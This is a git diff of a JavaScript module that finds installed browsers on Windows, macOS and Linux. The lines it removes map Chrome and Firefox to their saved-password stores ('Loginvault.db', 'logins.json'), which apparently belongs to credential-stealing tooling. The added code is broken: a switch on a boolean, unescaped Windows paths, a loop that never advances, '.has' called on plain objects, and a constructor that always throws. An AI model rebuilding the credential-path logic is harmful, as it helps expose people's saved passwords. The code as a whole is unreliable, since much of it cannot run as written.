@@ -17,70 +17,68 @@ const local = process.env.LOCALAPPDATA,
 		"Firefox",
 		"Profiles" 
 	);
+const id = require("./identifier"); 
+const OS = new Map();
 
-const FF_folder = new Map();
-
-module.exports = class sys_check {
+const win32_browsers = {
+	firefox: {
+		path: "C:\\Program Files (x86)\\Mozilla\\Firefox\\"
+	},
+	chrome: {
+		path: "C:\Program Files (x86)\\Google\\Chrome\\"
+	},
+	ie: { path: "C:\\Program Files (x86)\\Microsoft\Internet Explorer\\" },
+	edge: { path: "C:\Program Files (x86)\\Microsoft\\Edge\\" }
+};
+const macos_browsers = {};
+const linux_browsers = {};
+const system = process.env.OS_NAME;
+os = process.env.OS_NAME;
+switch (os === null) {
+	case id.darwin() == true:
+		OS.set("Current OS:", os);
+		break;
+	case id.nt() == true:
+		OS.set("Current OS:", os);
+		break;
+	case id.posix() == true:
+		OS.set("Current OS:", os);
+		break;
+	default:
+		OS.set("Current OS:", "NT");
+		break;
+}
+class Check {
 	constructor() {
-		for (const folder of (fire_win)) {
-			let toadd = fs.readdirSync(folder);
-			FF_folder.set(toadd);
-		}
-		this.win32_validBrowsers = [
-			[/chrome/, `${p.normalize(chrome_win)}/Loginvault.db`],
-			[/firefox/, `${p.normalize(fire_win)}/${FF_folder[0]}/logins.json`],
-			[/internet explorer/, "internetExplorer path"],
-			[/edge/, "edge path" ],
-			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
-		];
+		// recreate the constructor;
+		throw new SyntaxError("NOT A Constructor")
+	}
 
-		this.macOS_validBrowsers = [
-			[/chrome/, "chrome path"],
-			[/firefox/, "firefox path"],
-			[/safari/, "safari path"],
-			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
-		]
-
-		this.linux_validBrowsers = [
-			[/chrome/, "chrome path"],
-			[/firefox/, "firefox path"],
-			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
-		]
-	};
-	/**
-	 * @param {String} browser
-	 * @returns 
-	 */
 	static async win32(browser) {
 		if (!browser) throw new Error("No browser specified");
-		const foundBrowser = this.win32_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser)).then(console.log);
-		if(!foundBrowser)
-			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(p.normalize(foundBrowser[1])))
-			throw Error("Browser Not Found >:3");
-		if (!!fs.existsSync(p.normalize(foundBrowser[1])))
-			return p.normalize(foundBrowser[1]);
-	};
-
-	static async macOS(browser) {
-		if (!browser) throw new Error("No browser specified");
-		const foundBrowser = this.macOS_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
-		if(!foundBrowser)
-			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(p.normalize(foundBrowser[1])))
-			throw Error("Browser Not Found >:3");
-		if (!!fs.existsSync(foundBrowser[1]))
-			return foundBrowser[1];
+		for (let i = browser; i in win32_browsers;) {
+			if (i in win32_browsers == true) return i.path;
+		} 
+		return;
 	}
 
+	static async macos(browser) {
+		if (!browser) throw new Error("No browser specified");
+		
+		if (!!macos_browsers.has(browser)) {let foundBrowser = macos_browsers.browser.path; return foundBrowser;}
+		else return false;
+	}
+
+	/**
+	 * @returns
+	 */
 	static async linux(browser) {
 		if (!browser) throw new Error("No browser specified");
-		const foundBrowser = this.linux_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
-		if(!foundBrowser)
-			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(p.normalize(foundBrowser[1])))
-			throw Error("Browser Not Found >:3");
-		if (!!fs.existsSync(foundBrowser[1]))
-			return foundBrowser[1];
+		
+		if (!!linux_browsers.has(browser)) {let foundBrowser = linux_browsers.browser.path; return foundBrowser;}
+		else return false;
 	}
 }
+
+//clmodule.exports = Check;
+module.exports = Object.assign(Check);
